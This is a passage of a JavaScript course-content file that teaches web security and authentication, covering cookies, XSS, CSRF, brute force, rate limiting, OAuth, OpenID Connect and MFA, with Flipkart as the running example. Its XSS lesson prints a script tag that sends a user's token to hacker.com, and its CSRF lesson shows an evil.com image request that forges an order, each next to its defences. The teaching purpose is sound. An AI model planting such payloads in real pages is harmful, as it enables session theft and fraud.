        },

        // ── HTTPONLY COOKIE ──────────────────────────────────────────

        {
          type: "heading",
          text: "Option 2 — httpOnly Cookie"
        },

        {
          type: "paragraph",
          text: "An httpOnly cookie is set by the server. The browser stores it and automatically sends it with every request — but JavaScript on the page cannot read it at all. Not even Flipkart's own frontend code."
        },

        {
          type: "code",
          code: "// Server sets the token as an httpOnly cookie:\nres.cookie('refreshToken', 'eyJ...', {\n  httpOnly: true,   // JS cannot read this\n  secure: true,     // only sent over HTTPS\n  sameSite: 'strict' // not sent on cross-site requests\n});"
        },

        {
          type: "success-callout",
          text: "Even if a malicious script runs on Flipkart's page — it cannot read an httpOnly cookie. document.cookie won't show it. localStorage.getItem won't find it. It's invisible to JavaScript completely."
        },

        // ── SIDE BY SIDE ─────────────────────────────────────────────

        {
          type: "heading",
          text: "localStorage vs httpOnly Cookie"
        },

        {
          type: "table",
          headers: ["", "localStorage", "httpOnly Cookie"],
          rows: [
            ["Readable by JS", "✅ Yes — anyone", "❌ No — completely hidden"],
            ["XSS vulnerable", "✅ Yes", "❌ No"],
            ["Sent automatically", "❌ No — manual", "✅ Yes — browser handles it"],
            ["Best for", "Access Token (short-lived)", "Refresh Token (long-lived)"]
          ]
        },

        // ── WHAT REAL APPS DO ────────────────────────────────────────

        {
          type: "heading",
          text: "What Does Flipkart Actually Do?"
        },

        {
          type: "paragraph",
          text: "Most production apps split it — Access Token in memory (or localStorage), Refresh Token in an httpOnly cookie. This way even if a script steals the Access Token, it expires in 15 minutes. The Refresh Token — the dangerous long-lived one — is untouchable."
        },

        {
          type: "code",
          code: "// Access Token — short lived, stored in memory/localStorage\nlocalStorage.setItem('accessToken', accessToken);\n\n// Refresh Token — long lived, stored in httpOnly cookie\n// (server sets this automatically — frontend never touches it)\nres.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true });"
        },

        {
          type: "insight-callout",
          text: "💡 Refresh Token in httpOnly cookie + Token Rotation = even if somehow stolen, it's single-use and the server detects reuse immediately."
        },

        {
          type: "success-callout",
          text: "Token-Based Auth is now complete. JWT structure → Access vs Refresh → Token Rotation → Safe Storage. Each layer adds one more level of protection on top of the last."
        }

      ]


    },
    faqs: [
      {
        question: "Is Frontend Development really coding?",
        answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
      },
      { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
      { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
      { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
      { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
      { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
    ]
  },
  {
    id: 4,
    title: "Security Concepts",

    topics: [
      "XSS (Cross-Site Scripting)",
      "CSRF (Cross-Site Request Forgery)",
      "Brute force attacks",
      "Rate limiting & Input validation",

    ],
    topicDetails: {
      "XSS (Cross-Site Scripting)": [

        {
          type: "paragraph",
          text: "Ram is logged into Flipkart. Without him doing anything — a malicious script runs on the page and silently steals his token. This is XSS."
        },

        {
          type: "curious-callout",
          text: "❓ How does a malicious script end up running on Flipkart's page in the first place?"
        },

        // ── HOW XSS WORKS ────────────────────────────────────────────

        {
          type: "heading",
          text: "How XSS Works"
        },

        {
          type: "paragraph",
          text: "Flipkart has a product review section. A hacker submits a review — but instead of text, he writes a script tag. If Flipkart doesn't sanitize inputs, that script gets saved to the DB and rendered on the page for every user who visits."
        },

        {
          type: "code",
          code: "// Hacker submits this as a product review:\n<script>\n  fetch('https://hacker.com/steal?token=' + localStorage.getItem('accessToken'));\n</script>\n\n// Flipkart saves it. Ram opens the product page.\n// Script runs. Token sent to hacker. Done."
        },

        {
          type: "error-callout",
          title: "What the attacker gets:",
          list: [
            "Ram's Access Token from localStorage",
            "Full access to Ram's account for the next 15 minutes",
            "If Refresh Token is also in localStorage — access for 7 days",
            "This runs on every user who visits that product page — not just Ram"
          ],
          footer: "👉 One malicious review. Thousands of tokens stolen."
        },

        // ── HOW TO PREVENT ───────────────────────────────────────────

        {
          type: "heading",
          text: "How to Prevent XSS"
        },

        {
          type: "step",
          title: "Never trust user input — sanitize everything",
          desc: "Any content coming from users — reviews, comments, names — must be sanitized before saving or rendering. Strip out script tags and HTML entirely."
        },

        {
          type: "code",
          code: "// Never do this — renders raw HTML from user:\n<div dangerouslySetInnerHTML={{ __html: userReview }} />\n\n// Do this — escapes everything:\n<div>{userReview}</div>"
        },

        {
          type: "step",
          title: "Store Refresh Token in httpOnly cookie — not localStorage",
          desc: "A script cannot read httpOnly cookies at all. Even if XSS happens, the attacker gets the Access Token (15 min) but never the Refresh Token."
        },

        {
          type: "step",
          title: "Set a Content Security Policy (CSP)",
          desc: "CSP is a header the server sends that tells the browser — only run scripts from trusted sources. Any injected script from an unknown source gets blocked automatically."
        },

        {
          type: "code",
          code: "// Server sets this header:\nContent-Security-Policy: script-src 'self' https://trusted.cdn.com\n\n// Hacker's injected script tries to run → browser blocks it ❌"
        },

        {
          type: "success-callout",
          text: "Sanitize inputs + httpOnly cookies + CSP header = XSS attack has nothing to steal and nowhere to run."
        },

        {
          type: "warning-callout",
          text: "⚠️ XSS injects scripts into the page. But there's another attack that doesn't need to steal your token at all — it tricks your own browser into making requests on your behalf."
        },

        {
          type: "curious-callout",
          text: "❓ What if a hacker could make Ram's browser place an order on Flipkart — without Ram clicking anything?"
        },



      ],
      "CSRF (Cross-Site Request Forgery)": [

        {
          type: "paragraph",
          text: "Ram is logged into Flipkart. He opens another tab and visits some random website. That site quietly makes his browser place an order on Flipkart — without Ram clicking anything."
        },

        {
          type: "curious-callout",
          text: "❓ How? Ram is on a completely different website. How does it touch Flipkart?"
        },

        // ── HOW CSRF WORKS ───────────────────────────────────────────

        {
          type: "heading",
          text: "The Simple Reason This Works"
        },

        {
          type: "paragraph",
          text: "Remember — browser automatically sends cookies with every request to a domain. Ram is logged into Flipkart, so his session cookie is sitting in the browser. Any website can trigger a request to Flipkart. Browser will attach Ram's cookie automatically. Flipkart sees a valid session and processes it."
        },

        {
          type: "code",
          code: "<!-- Hacker's site — evil.com -->\n<!-- Ram just visits this page -->\n\n<img src='https://flipkart.com/order/place?item=iPhone&qty=1' />\n\n// Browser sees an image → fires a request to Flipkart\n// Attaches Ram's Flipkart cookie automatically\n// Flipkart thinks Ram ordered an iPhone ✅\n// Ram has no idea"
        },

        {
          type: "error-callout",
          title: "Key point — CSRF doesn't steal anything:",
          list: [
            "Hacker never sees Ram's cookie or token",
            "Hacker just tricks Ram's browser into making the request",
            "Browser does all the work — attaches cookie, sends request",
            "Flipkart can't tell if Ram clicked or a hacker's page triggered it"
          ],
          footer: "👉 XSS steals your token. CSRF doesn't need to — it just uses your browser as a puppet."
        },

        // ── HOW TO PREVENT ───────────────────────────────────────────

        {
          type: "heading",
          text: "How to Stop It"
        },

        {
          type: "step",
          title: "SameSite Cookie — simplest fix",
          desc: "Tell the browser — never send this cookie if the request is coming from another website."
        },

        {
          type: "code",
          code: "res.cookie('sessionId', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict'  // never sent from another site\n});"
        },

        {
          type: "step",
          title: "CSRF Token — backup for forms",
          desc: "Server gives every form a secret random token. When Ram submits the form, this token must come back with it. Hacker's site has no way to know this token — so its fake request gets rejected even if the cookie slips through."
        },

        {
          type: "code",
          code: "// Server puts a secret token in every form:\n<input type='hidden' name='_csrf' value='x9kP2m...' />\n\n// On submit — server checks it:\nif (req.body._csrf !== req.session.csrfToken) {\n  return res.status(403).send('Rejected');\n}"
        },

        {
          type: "success-callout",
          text: "SameSite=Strict is enough for most apps. Cookie stays on Flipkart's domain. Hacker's site can trigger a request but the browser won't attach the cookie. No cookie = no session = request dead."
        },

        {
          type: "warning-callout",
          text: "⚠️ XSS and CSRF are clever attacks. But some attackers skip all of this — they just hammer Ram's login page with thousands of password attempts until one works."
        },

        {
          type: "curious-callout",
          text: "❓ What stops a bot from trying ram123, ram1234, ram12345... a million times on Ram's account?"
        },


      ],
      "Brute force attacks": [

        {
          type: "paragraph",
          text: "A bot sits on Flipkart's login page and tries ram123, ram1234, ram12345, password1, iloveyou... thousands of times per second. No hacking. No exploits. Just guessing — until one works."
        },

        {
          type: "curious-callout",
          text: "❓ If there's no limit on login attempts — what stops a bot from trying every possible password until it gets in?"
        },

        {
          type: "heading",
          text: "How Brute Force Works"
        },

        {
          type: "paragraph",
          text: "Hackers use wordlists — giant files with millions of common passwords people actually use. They fire them at the login endpoint one by one. Most people use weak passwords. Given enough attempts, the bot gets in."
        },

        {
          type: "error-callout",
          title: "How fast is it without protection:",
          list: [
            "A bot can try 1000+ passwords per second on an unprotected endpoint",
            "Top 10,000 common passwords tried in under 10 seconds",
            "Ram uses 'ram123' — that's in every wordlist. First 100 attempts.",
            "No alert. No lockout. Flipkart never even noticed."
          ],
          footer: "👉 Brute force is the simplest attack. It works because most apps don't limit login attempts."
        },

        {
          type: "heading",
          text: "How to Stop It"
        },

        {
          type: "step",
          title: "Rate Limiting — block too many attempts",
          desc: "After 5 failed attempts from the same IP in 15 minutes — block that IP temporarily. Bot can't try 1000 passwords if it gets blocked after 5."
        },

        {
          type: "code",
          code: "const rateLimit = require('express-rate-limit');\n\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,  // 15 minute window\n  max: 5,                     // 5 attempts max\n  message: 'Too many attempts. Try again in 15 minutes.'\n});\n\napp.post('/auth/login', loginLimiter, loginHandler);"
        },

        {
          type: "step",
          title: "Account Lockout — freeze the account itself",
          desc: "If an account sees 5 failed attempts, lock it for 30 minutes. Even if the bot changes IPs, it can't get in until the lockout expires. Real users can wait 30 minutes or use 'Forgot Password' to regain access."
        },

        {
          type: "code",
          code: "// Track failed attempts per account in DB:\nif (user.failedAttempts >= 5) {\n  user.lockedUntil = Date.now() + 30 * 60 * 1000; // 30 min\n  await user.save();\n  return res.status(423).json({ message: 'Account locked. Try after 30 minutes.' });\n}\n\n// On wrong password:\nuser.failedAttempts += 1;\nawait user.save();\n\n// On success — reset:\nuser.failedAttempts = 0;\nuser.lockedUntil = null;"
        },

        {
          type: "step",
          title: "CAPTCHA after failed attempts",
          desc: "After 3 failed attempts, show a CAPTCHA. Bots can't solve it. Real users can. This stops automated attacks without fully locking Ram out."
        },

        {
          type: "step",
          title: "Slow down responses on failure",
          desc: "Add a deliberate delay on every failed login — 1 second, 2 seconds, increasing each time. A human doesn't notice. A bot trying 1000 attempts per second now takes hours."
        },

        {
          type: "code",
          code: "// Add delay on wrong password:\nif (!isMatch) {\n  await new Promise(r => setTimeout(r, 1000 * user.failedAttempts));\n  return res.status(401).json({ message: 'Invalid credentials' });\n}"
        },

        {
          type: "success-callout",
          text: "Rate limiting + account lockout + increasing delay = a bot that could try 1000 passwords per second now realistically can't crack an account in a lifetime."
        },

        {
          type: "warning-callout",
          text: "⚠️ Brute force is stopped. But bots can also hammer other endpoints — search, OTP, APIs — not just login. Every public endpoint needs protection."
        },

        {
          type: "curious-callout",
          text: "❓ What if a bot sends 10,000 requests to Flipkart's search API in one second? Or tries every possible OTP combination? How does Flipkart protect all its endpoints — not just login?"
        },



      ],
      "Rate limiting & Input validation": [

        {
          type: "paragraph",
          text: "Brute force targets the login page. But Flipkart has hundreds of endpoints — search, OTP, checkout, reviews, APIs. Any of them can be hammered. Rate limiting is the shield in front of all of them."
        },

        {
          type: "curious-callout",
          text: "❓ What if someone sends 50,000 requests to Flipkart's search API in one second — not to hack, just to crash the server?"
        },

        // ── RATE LIMITING ────────────────────────────────────────────

        {
          type: "heading",
          text: "Rate Limiting"
        },

        {
          type: "paragraph",
          text: "Rate limiting says — one IP or one user can only make X requests in Y time. Cross that limit, requests get blocked. Simple. Applies to every endpoint, not just login."
        },

        {
          type: "code",
          code: "const rateLimit = require('express-rate-limit');\n\n// Global limit — every endpoint:\napp.use(rateLimit({\n  windowMs: 60 * 1000,  // 1 minute\n  max: 100,              // 100 requests per minute per IP\n  message: 'Too many requests. Slow down.'\n}));\n\n// Stricter limit for sensitive endpoints:\napp.use('/auth/otp', rateLimit({\n  windowMs: 10 * 60 * 1000,  // 10 minutes\n  max: 3                      // only 3 OTP attempts\n}));"
        },

        {
          type: "insight-callout",
          text: "💡 Different endpoints need different limits. OTP — 3 attempts. Search — 100 per minute. Checkout — 10 per minute. One global limit doesn't fit all."
        },

        {
          type: "error-callout",
          title: "Without rate limiting:",
          list: [
            "Bot hammers OTP endpoint — tries all 10,000 possible 4-digit OTPs",
            "Someone floods search API — server CPU spikes, real users get errors",
            "Competitor scrapes entire Flipkart product catalog in minutes",
            "DDoS attack — thousands of bots, millions of requests — server crashes"
          ],
          footer: "👉 Rate limiting stops all of this before it reaches your actual code."
        },

        // ── INPUT VALIDATION ─────────────────────────────────────────

        {
          type: "heading",
          text: "Input Validation"
        },

        {
          type: "paragraph",
          text: "Every piece of data coming from the user is untrusted. Name, email, address, quantity, review — any of it could be malicious. Input validation checks the data before your code ever touches it."
        },

        {
          type: "error-callout",
          title: "What happens without input validation:",
          list: [
            "User sends quantity: -1 → order placed for negative items → billing breaks",
            "User sends email: 'notanemail' → saved to DB → crashes later when used",
            "User sends a 10MB string as their name → server runs out of memory",
            "User injects SQL in a form field → entire database wiped"
          ],
          footer: "👉 Never trust what comes from the client. Validate everything on the server."
        },

        {
          type: "step",
          title: "Validate shape — is this what we expect?",
          desc: "Check that every field is the right type, right format, right length before doing anything with it."
        },

        {
          type: "code",
          code: "const { z } = require('zod');\n\nconst orderSchema = z.object({\n  productId: z.string().uuid(),\n  quantity:  z.number().min(1).max(100),\n  address:   z.string().min(10).max(200)\n});\n\n// On every order request:\nconst result = orderSchema.safeParse(req.body);\nif (!result.success) {\n  return res.status(400).json({ error: result.error });\n}"
        },

        {
          type: "step",
          title: "Sanitize — strip dangerous content",
          desc: "Even if the shape is valid, the content might be dangerous. Strip HTML tags, script tags, and special characters from anything that will be stored or rendered."
        },

        {
          type: "code",
          code: "const sanitizeHtml = require('sanitize-html');\n\n// User submits a product review:\nconst cleanReview = sanitizeHtml(req.body.review, {\n  allowedTags: [],         // no HTML tags allowed at all\n  allowedAttributes: {}    // no attributes allowed\n});\n\n// '<script>steal()</script> Great product!'\n// → 'Great product!'"
        },

        {
          type: "step",
          title: "Reject early — never let bad data reach the DB",
          desc: "Validate at the route level before any business logic runs. Bad data should never touch your database, your services, or your other users."
        },

        {
          type: "success-callout",
          text: "Rate limiting stops abuse at the network level. Input validation stops damage at the data level. Together they protect Flipkart before bad requests ever reach real code."
        },

        {
          type: "warning-callout",
          text: "⚠️ One last piece of the security puzzle — the cookies themselves. httpOnly stops JS from reading them. But there's more to a secure cookie than just httpOnly."
        },

        {
          type: "curious-callout",
          text: "❓ What do Secure and SameSite flags actually do on a cookie? And why does missing one flag leave Ram exposed?"
        },



      ]
    },
    // faqs: [
    //   {
    //     question: "Is Frontend Development really coding?",
    //     answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
    //   },
    //   { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
    //   { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
    //   { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
    //   { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
    //   { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
    // ]
  },
  {
    id: 5,
    title: "Advanced Authentication",

    topics: [
      "OAuth 2.0 (Login with Google, etc.)",
      "OpenID Connect",
      "Multi-Factor Authentication (OTP, Authenticator apps)",

    ],
    topicDetails: {
      "OAuth 2.0 (Login with Google, etc.)": [

        {
          type: "paragraph",
          text: "Ram opens Flipkart and sees 'Login with Google'. He clicks it — no password, no signup form. Two seconds later he's inside his Flipkart account. How?"
        },

        {
          type: "curious-callout",
          text: "❓ Flipkart doesn't have Ram's Google password. Google never shared it. So how does Flipkart know it's really Ram?"
        },

        {
          type: "heading",
          text: "The Simple Idea Behind OAuth"
        },

        {
          type: "paragraph",
          text: "Instead of Ram giving his Google password to Flipkart — Ram tells Google directly: 'I trust Flipkart, share my name and email with them'. Google then gives Flipkart a token as proof. Flipkart uses that token. No password ever leaves Google."
        },

        {
          type: "insight-callout",
          text: "💡 Think of it like this — Ram goes to a hotel. Instead of giving the hotel his house keys, the hotel gives him a key card that only opens his room. Google is the hotel. The key card is the token."
        },

        {
          type: "heading",
          text: "What Happens Step by Step"
        },

        {
          type: "step",
          title: "Step 1 — Ram clicks 'Login with Google' on Flipkart",
          desc: "Flipkart immediately sends Ram to Google's login page. Ram is now on Google's website — not Flipkart's."
        },

        {
          type: "step",
          title: "Step 2 — Ram logs in on Google's page and gives permission",
          desc: "Ram types his Google password on Google's own page — Flipkart never sees this. Google then asks Ram: 'Flipkart wants to see your name and email. Is that okay?' Ram clicks Allow."
        },

        {
          type: "step",
          title: "Step 3 — Google sends a one-time code to Flipkart",
          desc: "Google sends Ram back to Flipkart — but attaches a short-lived secret code in the URL. This code is not the token. It's just a temporary code that Flipkart can exchange for the real token in the next step."
        },

        {
          type: "code",
          code: "// Ram gets redirected back to Flipkart with a code:\nhttps://flipkart.com/auth/callback?code=4/0AX4XfWh..."
        },

        {
          type: "step",
          title: "Step 4 — Flipkart secretly exchanges that code with Google",
          desc: "Behind the scenes, Flipkart's server makes a POST request to Google — 'Here's the code we got from Ram. Can we exchange it for an Access Token?' Google verifies the code, checks that Flipkart is legit, and if everything checks out — Google gives Flipkart an Access Token."
        },

        {
          type: "code",
          code: "// Flipkart's server talks to Google privately:\nPOST https://oauth2.googleapis.com/token\n{\n  code: '4/0AX4XfWh...',\n  client_id: 'flipkart_client_id',\n  client_secret: 'flipkart_secret',\n  grant_type: 'authorization_code'\n}\n\n// Google replies:\n{\n  access_token: 'ya29.A0ARrd...'  // Flipkart can use this to fetch Ram's info\n}"
        },

        {
          type: "step",
          title: "Step 5 — Flipkart uses the Access Token to get Ram's info",
          desc: "Now that Flipkart has the Access Token, it can ask Google — 'Hey Google, can you give me Ram's name and email associated with this token?' Google checks the token, sees it's valid, and replies with Ram's details."
        },

        {
          type: "code",
          code: "// Flipkart asks Google:\nGET https://www.googleapis.com/oauth2/v2/userinfo\nAuthorization: Bearer ya29.A0ARrd...\n\n// Google replies:\n{\n  email: 'ram@gmail.com',\n  name: 'Ram Kumar',\n  picture: 'https://...'\n}"
        },

        {
          type: "success-callout",
          text: "Ram's Google password never left Google. Flipkart only received what Ram approved — his name and email. That's it. That's OAuth 2.0."
        },

        {
          type: "heading",
          text: "Why Was OAuth Even Created?"
        },

        {
          type: "error-callout",
          title: "Before OAuth — the scary old way:",
          list: [
            "Flipkart would ask: 'Give us your Gmail and password'",
            "Flipkart would log into Google pretending to be Ram",
            "Ram has to completely trust Flipkart with his Google password",
            "Flipkart gets hacked → hacker now has Ram's Google password → Gmail, Drive, everything gone"
          ],
          footer: "👉 OAuth fixed this completely. Apps never need your password anymore — just a token Google issues."
        },

        {
          type: "warning-callout",
          text: "⚠️ OAuth gave Flipkart access to Ram's data. But access to data is not the same as confirming who Ram actually is. There's a difference."
        },

        {
          type: "curious-callout",
          text: "❓ How does Flipkart know the token it received really belongs to Ram — and not someone else pretending to be Ram?"
        },



      ],

      "OpenID Connect": [

        {
          type: "paragraph",
          text: "OAuth 2.0 is done. Flipkart has an Access Token from Google. But that token just says 'someone gave you permission'. It doesn't say who that someone is. Flipkart still needs to confirm — is this Ram or is this someone pretending to be Ram?"
        },

        {
          type: "curious-callout",
          text: "❓ OAuth answers 'can Flipkart access Ram's data?'. But who answers 'is this actually Ram?'"
        },

        {
          type: "heading",
          text: "What OpenID Connect Adds"
        },

        {
          type: "paragraph",
          text: "OpenID Connect is a layer on top of OAuth 2.0 that adds authentication. It gives Flipkart not just an Access Token — but also an ID Token. The ID Token is a signed JWT that contains Ram's identity information, directly from Google."
        },

        {
          type: "code",
          code: "// OAuth alone gives:\n{ access_token: 'ya29...' }  // a key to fetch data\n\n// OpenID Connect gives both:\n{\n  access_token: 'ya29...',    // key to fetch data\n  id_token: 'eyJhbGci...'    // Ram's identity card, signed by Google\n}"
        },

        {
          type: "insight-callout",
          text: "💡 Access Token = key to a locker. ID Token = Aadhaar card that proves who is holding the key."
        },

        {
          type: "heading",
          text: "What's Inside the ID Token?"
        },

        {
          type: "paragraph",
          text: "The ID Token is a JWT. Flipkart decodes it and immediately reads Ram's details — no extra API call needed."
        },

        {
          type: "code",
          code: "// ID Token decoded — what Flipkart sees:\n{\n  iss: 'https://accounts.google.com', // Google issued this\n  sub: '1234567890',                  // Ram's permanent Google ID\n  email: 'ram@gmail.com',\n  name: 'Ram Kumar',\n  exp: 1716003600                     // token expires at this time\n}"
        },

        {
          type: "insight-callout",
          text: "💡 The 'sub' is Ram's permanent unique ID on Google. Ram can change his email, his name — but sub never changes. Flipkart uses sub to identify Ram reliably every single time."
        },

        {
          type: "heading",
          text: "How Flipkart Uses the ID Token"
        },

        {
          type: "step",
          title: "Step 1 — Flipkart receives the ID Token",
          desc: "After the OAuth flow, Google returns both the Access Token and ID Token together to Flipkart."
        },

        {
          type: "step",
          title: "Step 2 — Flipkart verifies the ID Token is genuine",
          desc: "Flipkart's server takes the ID Token and verifies it using Google's public keys. This confirms that the token was indeed issued by Google and hasn't been tampered with."
        },

        {
          type: "code",
          code: "const { OAuth2Client } = require('google-auth-library');\nconst client = new OAuth2Client('flipkart_client_id');\n\nconst ticket = await client.verifyIdToken({\n  idToken: req.body.idToken,\n  audience: 'flipkart_client_id'\n});\n\nconst payload = ticket.getPayload();\n// { sub: '1234567890', email: 'ram@gmail.com', name: 'Ram Kumar' }"
        },

        {
          type: "step",
          title: "Step 3 — Flipkart finds Ram's account or creates one",
          desc: "Flipkart checks its own database — does a user with this Google sub ID exist? If yes, log them in. If no, create a fresh Flipkart account automatically using the name and email from the ID Token."
        },

        {
          type: "code",
          code: "let user = await User.findOne({ googleId: payload.sub });\n\nif (!user) {\n  user = await User.create({\n    googleId: payload.sub,\n    email: payload.email,\n    name: payload.name\n  });\n}\n\n// Ram is now logged in — Flipkart issues its own JWT\nconst token = jwt.sign({ userId: user.id }, 'flipkart_secret');"
        },

        {
          type: "success-callout",
          text: "Ram clicked 'Login with Google'. Google confirmed his identity via the ID Token. Flipkart found his account. Issued its own JWT. Ram is in — without ever creating a password on Flipkart."
        },

        {
          type: "table",
          headers: ["", "OAuth 2.0", "OpenID Connect"],
          rows: [
            ["What it does", "Gives access to Ram's data", "Confirms who Ram actually is"],
            ["Token given", "Access Token", "Access Token + ID Token"],
            ["Answers", "Can Flipkart see Ram's info?", "Is this definitely Ram?"],
            ["Relation", "The base standard", "Built on top of OAuth 2.0"]
          ]
        },

        {
          type: "warning-callout",
          text: "⚠️ Ram is verified. But what if an attacker somehow got Ram's correct Google password? They'd pass OAuth, pass OpenID Connect — and be inside Ram's account."
        },

        {
          type: "curious-callout",
          text: "❓ What's the one layer of protection that stops an attacker even when they have the correct password?"
        },



      ],
      "Multi-Factor Authentication (OTP, Authenticator apps)": [

        {
          type: "paragraph",
          text: "Ram's password is correct. OpenID Connect confirmed his identity. But Google still shows one more screen — 'Enter the 6-digit code from your authenticator app'. Why? Because passwords can be stolen. This second step cannot."
        },

        {
          type: "curious-callout",
          text: "❓ A hacker has Ram's exact Google password. They type it in correctly. What is the one thing that stops them from getting inside Ram's account?"
        },

        {
          type: "heading",
          text: "The Simple Idea Behind MFA"
        },

        {
          type: "paragraph",
          text: "MFA stands for Multi-Factor Authentication. It means — to log in, you need to provide two or more pieces of evidence (factors) that prove who you are. Even if a hacker has one factor (like the password), they won't have the second factor (like the OTP from Ram's phone)."
        },



        {
          type: "heading",
          text: "The Three Categories of Factors"
        },

        {
          type: "paragraph",
          text: "Every MFA method belongs to one of three categories. A strong system always picks factors from two different categories — never two from the same one."
        },

        {
          type: "table",
          headers: ["Category", "What it means", "Examples"],
          rows: [
            ["Something you know", "Lives in your memory", "Password, PIN, security question"],
            ["Something you have", "A physical object you carry", "Phone (OTP), hardware key (YubiKey)"],
            ["Something you are", "A part of your body", "Fingerprint, Face ID, retina scan"]
          ]
        },

        {
          type: "heading",
          text: "How OTP Works — Step by Step"
        },

        {
          type: "step",
          title: "Step 1 — Ram enters his password correctly",
          desc: "Google accepts the password. But instead of logging Ram in, Google pauses and triggers the second factor check. The password alone is no longer enough."
        },

        {
          type: "step",
          title: "Step 2 — Google asks for the OTP",
          desc: "Google sends a 6-digit OTP to Ram's phone via SMS — or Ram opens his authenticator app (Google Authenticator, Authy) which generates a fresh code every 30 seconds. This code exists only on Ram's physical device."
        },

        {
          type: "step",
          title: "Step 3 — Ram types the OTP",
          desc: "Ram enters the 6-digit code into Google's login screen. The code is time-based — it expires in 30 seconds. If Ram types the wrong code 3 times, the account locks."
        },

        {
          type: "code",
          code: "// What Google checks on the server:\n{\n  userId:     'ram@gmail.com',\n  otpCode:    '482931',         // what Ram typed\n  expiresAt:  1716003900,       // valid for 30 seconds only\n  attempts:   1,                // wrong guesses so far (max 3)\n  verified:   false             // flips to true if code matches\n}"
        },

        {
          type: "step",
          title: "Step 4 — Google verifies the OTP",
          desc: "Google checks — does the code Ram typed match the code Google generated for this exact 30-second window? If yes, verified flips to true. Ram is in. If no, attempts goes up. After 3 wrong attempts, the account is temporarily locked."
        },

        {
          type: "code",
          code: "// Google's OTP verification logic (simplified):\nconst isValid = (\n  otpCode === generateTOTP(ram.secret) &&  // code matches\n  Date.now() < expiresAt &&               // not expired\n  attempts < 3                             // not locked\n);\n\nif (isValid) {\n  session.verified = true;   // Ram gets in\n} else {\n  attempts++;                // one strike closer to lockout\n}"
        },

        {
          type: "success-callout",
          text: "Ram's password was factor one. The OTP from his phone was factor two. The hacker had the password — but not the phone. MFA stopped them completely. Ram is in. Hacker is out."
        },

        {
          type: "heading",
          text: "OTP vs Authenticator App — What's the Difference?"
        },

        {
          type: "table",
          headers: ["", "SMS OTP", "Authenticator App (TOTP)"],
          rows: [
            ["How it arrives", "Google sends it to Ram's number", "App generates it locally on Ram's phone"],
            ["Works offline?", "No — needs network/signal", "Yes — works without internet"],
            ["Can be intercepted?", "Yes — SIM swap attacks possible", "Much harder — never travels over network"],
            ["Examples", "Most bank logins, Flipkart OTP", "Google Authenticator, Authy, Microsoft Authenticator"],
            ["Security level", "Good", "Better"]
          ]
        },

        {
          type: "warning-callout",
          text: "⚠️ SMS OTP can be hijacked via SIM swapping — where an attacker tricks the telecom provider into transferring Ram's number to their SIM. Authenticator apps are safer because the code never leaves Ram's device."
        },

        {
          type: "heading",
          text: "How Authenticator Apps Generate Codes Without Internet"
        },

        {
          type: "paragraph",
          text: "Authenticator apps use a shared secret key that was set up during the initial MFA enrollment. Both Google and the app have this secret. They use it to independently generate the same 6-digit code every 30 seconds using a standard algorithm called TOTP (Time-based One-Time Password)."
        },

        {
          type: "code",
          code: "// TOTP formula (both Google server and Ram's app run this):\nOTP = HMAC(secretKey, Math.floor(Date.now() / 30000))\n\n// secretKey  — shared once at setup, never sent again\n// 30000ms    — 30-second time window\n// Both sides compute the same number independently\n// If Ram's code matches Google's code → verified"
        },
        {
          type: "curious-callout",
          text: "❓ MFA protects the login. But Ram still had to click 'Login with Google', confirm permissions, enter an OTP — every single time? Or is there a smoother way all of this gets packaged together into one seamless experience?"
        },



      ]
    },

    // faqs: [
    //   {
    //     question: "Is Frontend Development really coding?",
    //     answer: "Do frontend developers really code? The answer is yes, absolutely.\n\nThe fact that frontend developers are full-time developers who produce an output that is visually appealing (thanks to the designs provided by others) sometimes confuses others, making them believe that frontend developers aren’t really coding. However, that couldn’t be further from the truth.\n\nAs a frontend developer, you’ll be coding all the time.\n\nWhile in some companies, the frontend developer is also a skilled designer or UX engineer, those are not the typical profiles. As a frontend dev, your learning focus should be coding-related (i.e coding best practices, software design patterns, frontend architecture, etc)."
    //   },
    //   { question: "Is Frontend Developer a good career?", answer: "Yes, it is a highly demanded and rewarding career path." },
    //   { question: "How to prepare for a frontend developer interview?", answer: "Practice algorithms, build portfolio projects, and understand core web fundamentals like HTML, CSS, and JS." },
    //   { question: "How is Frontend Development different from Backend Development?", answer: "Frontend deals with the user interface and browser, while backend deals with servers, databases, and business logic." },
    //   { question: "What are the job titles of a Frontend Developer?", answer: "Frontend Engineer, UI Developer, Web Developer, UX Engineer, etc." },
    //   { question: "How to become a Frontend Developer?", answer: "Learn HTML, CSS, JavaScript, pick a framework like React or Vue, and build projects." }
    // ]
  },
  // {
  //   id: 6,
  //   title: "Scalable System Design",
